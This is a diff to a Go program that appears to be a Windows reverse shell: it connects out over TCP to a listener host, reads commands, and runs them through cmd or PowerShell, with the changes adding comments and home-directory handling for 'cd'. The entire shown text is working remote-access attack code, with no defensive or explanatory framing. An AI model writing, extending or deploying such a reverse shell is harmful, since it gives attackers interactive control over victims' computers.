@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
 	"syscall"
 	"time"
@@ -22,11 +23,7 @@ func main() {
 	switch *term {			//choose witch terminal to use
 	case "cmd":
 		terminal = "cmd"
-	case "c":
-		terminal = "cmd"
-	case "powershell":
-		terminal = "powershell"
-	case "p":
+	case "pwsh":
 		terminal = "powershell"
 	default:
 		terminal = "powershell"
@@ -35,7 +32,7 @@ func main() {
 }
 
 func reverse(host string,term string) {
-	c, err := net.Dial("tcp", host)
+	c, err := net.Dial("tcp", host)		//Connect to listener
 	if err != nil {
 		if c != nil {
 			c.Close()
@@ -54,11 +51,16 @@ func reverse(host string,term string) {
 			fmt.Println("Closed... :(")
 			return
 		}
-		order = strings.TrimSuffix(order,"\n")
+		order = strings.TrimSuffix(order,"\n")		//Remove the "\n"
 		args := strings.Split(order, " ")
+		usr, _:= user.Current()								//Get the home dir
 		switch args[0] {
 		case "cd":
-			os.Chdir(args[1])
+			if len(args) == 1 {								//go to home directory if command is "cd"
+				os.Chdir(usr.HomeDir)
+			} else {
+				os.Chdir(args[1])
+			}
 		case "exit":
 			os.Exit(0)
 		default:
